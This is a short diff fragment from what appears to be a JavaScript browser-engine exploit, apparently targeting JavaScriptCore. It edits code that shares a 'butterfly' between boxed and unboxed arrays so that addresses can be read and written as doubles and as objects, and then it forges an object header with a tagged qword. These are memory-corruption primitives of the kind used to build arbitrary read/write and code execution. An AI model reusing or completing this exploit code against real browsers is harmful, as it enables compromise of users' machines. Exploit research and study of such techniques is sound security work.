@@ -507,10 +507,10 @@ for (var i = 0; i < 1000; ++i) {
     // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
     // and then access them as objects with boxed[]
     hax[1] = unboxed;
-    var tmp_bfly_ptr = victim[1];
+    var tmp_bfly_ptr = victim1[1];
     print("shared butterfly @ " + hex1(tmp_bfly_ptr));
     hax[1] = boxed;
-    victim[1] = tmp_bfly_ptr;
+    victim1[1] = tmp_bfly_ptr;
 
     container.header = qwordAsTagged(0x0108230700000000);
 
